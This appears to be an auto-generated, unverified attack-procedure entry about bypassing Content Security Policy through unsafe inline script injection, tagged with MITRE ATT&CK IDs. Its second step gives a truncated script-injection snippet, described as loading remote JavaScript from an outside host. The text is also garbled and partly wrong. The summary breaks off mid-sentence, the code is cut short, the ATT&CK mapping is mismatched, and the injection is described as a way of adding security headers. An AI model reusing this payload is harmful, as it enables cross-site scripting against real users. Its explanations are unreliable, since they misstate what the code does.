---
id: ec48abf3-b00f-443a-8105-98bdc75392e2
name: CSP Bypass via Unsafe Inline Script Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:43.214205+00:00'
updated_at: '2023-04-10T20:21:50.575758+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Create Account|T1136 - Create Account]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)]]'
- '[[Cross Site Scripting]]'
- '[[CSP Bypass]]'
commands:
- '[[Configure Content Security Policy]]'
---

# CSP Bypass via Unsafe Inline Script Injection

## Summary

This procedure outlines a method to bypass Content Security Policy (CSP) by injecting an unsafe inline script. CSP is a security feature that is used to prevent cross-site scripting (XSS) attacks by restricting the types of content that can be loaded on a web page. However, if an attacker is able t

## Description

# Description

This procedure outlines a method to bypass Content Security Policy (CSP) by injecting an unsafe inline script. CSP is a security feature that is used to prevent cross-site scripting (XSS) attacks by restricting the types of content that can be loaded on a web page. However, if an attacker is able to inject a script into a page with a CSP policy that allows for unsafe inline scripts, they can bypass the CSP and execute arbitrary code on the victim's browser. This attack can be used to steal sensitive information, perform actions on behalf of the victim, or spread malware.

To perform this attack, an attacker would need to find a page that allows for unsafe inline scripts and inject their own script. This can be done through various means, such as exploiting an XSS vulnerability or tricking a user into clicking on a malicious link. Once the script is injected, it will execute on the victim's browser, bypassing the CSP policy and allowing the attacker to carry out their objectives.

This procedure can be used by attackers to bypass CSP policies and execute arbitrary code on a victim's browser, potentially leading to data theft, unauthorized actions, and malware infections.

## Requirements

1. Access to a web page that allows for unsafe inline scripts

1. Ability to inject a script into the web page

## Defense

1. Implement strict CSP policies that do not allow for unsafe inline scripts

1. Regularly scan web pages for vulnerabilities that could be exploited to inject scripts

1. Train users to be aware of phishing attacks and not click on suspicious links

## Objectives

1. Bypass CSP policies to execute arbitrary code on a victim's browser

1. Steal sensitive information from the victim

1. Perform actions on behalf of the victim

1. Spread malware to other systems

# Instructions

1. To implement CSP with default source and unsafe inline, add the following line of code to your website's HTTP header:

**Code**: [[Content-Security-Policy: default-src &#39;self&#39]]

> This command sets the default source for the Content Security Policy to 'self', meaning that resources can only be loaded from the same origin as the website. However, it also allows the use of 'unsafe-inline' which can potentially allow for XSS attacks. It is recommended to avoid using 'unsafe-inline' and instead use a strict CSP policy to ensure the security of your website.

**Command** ([[Configure Content Security Policy]]):

```bash
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```

2. Inject a CSP script into the head of a webpage.

**Code**: [[script=document.createElement('script');
script.sr]]

> This command will create a new script element and set its source to '//bo0om.ru/csp.js'. It will then append this script element to the head of the first frame of the webpage. This command is useful for adding Content Security Policy (CSP) headers to a webpage to improve its security.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Create Account|T1136 - Create Account]]
- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Configure Content Security Policy]]

## Tags

- [[Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)]]
- [[Cross Site Scripting]]
- [[CSP Bypass]]
